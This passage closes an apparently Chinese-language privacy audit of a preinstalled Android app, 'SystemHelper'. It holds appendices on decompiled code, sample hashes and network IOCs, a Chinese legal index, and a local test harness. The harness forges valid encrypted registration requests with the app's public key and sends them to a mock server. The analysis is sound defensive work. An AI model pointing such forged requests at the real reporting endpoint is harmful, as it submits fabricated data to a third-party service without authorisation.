| `android.support.*` / `android.arch.*` / `androidx.*` | ~524 | 第三方库 | 按包判定 | 公开库原码 |

**关键判定**：`a.b.*` 与 `a.a.a.*` **不是自有业务代码**，而是被 R8 重命名的 support 库。这一认知修正使自有代码量从"约 300 类"降到"约 111 类"。

## 附录 C｜反编译产物

`audit/decompiled/` 下有两份同源导出：

| 目录 | 内容 | 规模 |
|---|---|---|
| `raw/` | JADX 原始输出，**未反混淆** | 20 文件 / 3,253 行 |
| `deobfuscated/` | 人工语义化，**反混淆** | 9 文件 / 1,322 行 |

**重要**：样本无 `mapping.txt`，不存在自动反混淆的可能。`deobfuscated/` 下是人工按语义推断的名字，不是原始源码名；绝对保真以 `raw/` 为准。

两处节选已在文件内标注：`f1.java` 机型表（200+ → 40 条）、`RegisterIntentService.onHandleIntent`（JADX 还原失败，按 smali 语义转写）。

## 附录 D｜本地验证方法

`tools/` 提供本地闭环，用 `assets/pub.cer` 构造格式合法的请求，打到本机模拟服务端（不发往任何外部服务器）。

```powershell
# 终端 1
python -u capture_server.py 8080

# 终端 2
bash forge_request.sh sample_valid.json http://127.0.0.1:8080/registerv3
bash ./curl_cmd.sh
```

模拟服务端实现了九道校验（UA、Content-Type、参数、sign 长度、body 对齐、解密、业务字段、去重、限流），四条路径均实测通过：

| 场景 | 返回 |
|---|---|
| 非法样本（IMEI 未过 Luhn、号码与运营商冲突） | `409` |
| 合法样本 | `200` + `regId` |
| 重复提交同一 sign（RSA 确定性） | `416`（客户端视为成功） |
| 裸 curl（无 Dalvik UA） | `403` |

**实测验证的密码学结论**：用 `MD5(明文)` 直接解密 body，结果与原文件逐字节一致。

**实测验证的 ECB 结论**：本样本 71 个密文块全部唯一，未观察到块重复 —— 不应夸大为"肉眼可见的重复块"。

## 附录 E｜样本指纹与 IOC

```
文件名    : SystemHelper_1.2-20221110.apk
大小      : 1,762,193 字节
MD5       : a78da3f746597509ab61054689a65353
SHA-256   : 6658c4be127bdf57ae276a91ae686a9fe26e65f17ee3ba5dec91c61d51fee3b4
包名      : com.mobiletools.systemhelper
版本      : 1.2-20221110 (versionCode 3)
minSdk    : 24 / targetSdk: 33 / compileSdk: 33
DEX       : classes.dex (1,171,504 字节)
类/包     : 815 / 192

签名证书  : CN=bbkmobile.com.cn, OU=IQOO, O=BBK, C=CN
          序列号 b153730d8a352539，2012-09-25 → 2040-02-11
          SHA1withRSA / 2048 bit / BasicConstraints CA:true
          SHA-256: BC:C3:5D:4D:36:06:F1:54:F0:40:2A:B7:63:4E:84:90:C0:B2:44:C2:67:5C:3C:62:38:98:69:87:02:4F:0C:02

上报公钥  : assets/pub.cer（DER）
          主体 C=CN, ST=BJ, L=BJ, O=UNICOM, OU=UNICOM, CN=UNICOM
          1024 bit RSA，2019-05-24 → 2119-04-30

网络 IOC  : dm.wo.com.cn:18080
          /registerv3   （上报，POST）
          /public/ip    （公网 IP 回显，GET）
          Content-Type: application/encrypted-json
          URL 参数: ver, model, manuf, sign

本地文件  : /data/data/com.mobiletools.systemhelper/databases/systemhelper
          /data/data/com.mobiletools.systemhelper/databases/signalhelper
          /data/data/com.mobiletools.systemhelper/shared_prefs/
              com_mobiletools_systemhelper_preference.xml

日志 TAG  : RegisterThread, DeviceManager, DeviceInfo, DeviceInfoReaderBase,
          HttpEncryptHelper, GetIPAddressThread, RegisterHelperService,
          DMTelephonyCallback, MemoryUtils, DMPhoneStateListener

关键配置键: serverAddress, preference_enable_log, scheduleInterval,
          appInfoInterval, signalInfoInterval, firstPowerOn, iccid1, iccid2,
          dm_user_agreement（系统设置）, operator_service_improve_plan（系统设置）

组件      : com.mobiletools.systemhelper.service.RegisterHelperService
          com.mobiletools.systemhelper.Activity.TestActivity
```

## 附录 F｜法条索引

| 法条 | 内容要点 | 本报告引用位置 |
|---|---|---|
| 个保法 第 6 条 | 最小必要、影响最小 | 5.3, 5.10.1 |
| 个保法 第 13 条 | 六种合法性基础（封闭列举） | 5.10.1 |
| 个保法 第 14 条 | 同意应自愿、明确 | 5.2.4 |
| 个保法 第 15 条 | 撤回同意权 | 5.6.1 |
| 个保法 第 17 条 | 七项告知义务 | 5.2.3 |
| 个保法 第 24 条 | 自动化决策（画像）须告知并可拒绝 | 5.11.3 |
| 个保法 第 28 条 | 敏感个人信息定义 | 4.3 |
| 个保法 第 29 条 | 敏感信息单独同意 | 5.2.6 |
| 个保法 第 31 条 | 未成年人（14 周岁以下）监护人同意 | 5.9 |
| 个保法 第 44–49 条 | 十项个人权利 | 5.6.1 |
| 个保法 第 50 条 | 权利申请受理机制 | 5.6.1 |
| 个保法 第 51 条 | 安全技术措施（加密、去标识化） | 5.10, 6.5.2 |
| 个保法 第 66 条 | 罚则（最高 5000 万或营业额 5%） | 9.1 |
| 个保法 第 69 条 | 过错推定责任 | 5.13 |
| 民法典 第 1034–1039 条 | 隐私权与个人信息保护 | 5.13 |
| 网络安全法 第 21 条 | 网络日志留存（≠ 应用清单） | 9.2 |
| 刑法 第 253 条之一 | 侵犯公民个人信息罪 | 9.3 |
| 刑法 第 285 条 | 非法获取计算机信息系统数据罪 | 9.3 |
| 工信部 24 号令 第 8、9 条 | 公布收集规则、未经同意不得收集 | 9.1 |
| 信管〔2016〕407 号 第 6、7 条 | 预置应用不得擅自收集、应可卸载 | 9.1 |
| GB/T 35273-2020 | 5.2 收集规则、6.3 传输加密、7.1 撤回 | 5.10 |

---

*本报告基于 `SystemHelper_1.2-20221110.apk` 的纯静态反编译，未对目标服务器发起任何网络请求，所有 PoC 均为概念性说明。报告标注 `[C]` `[D]` 的事项未经证实，不构成结论。所有结论可依附录 A 的证据索引独立复核。*



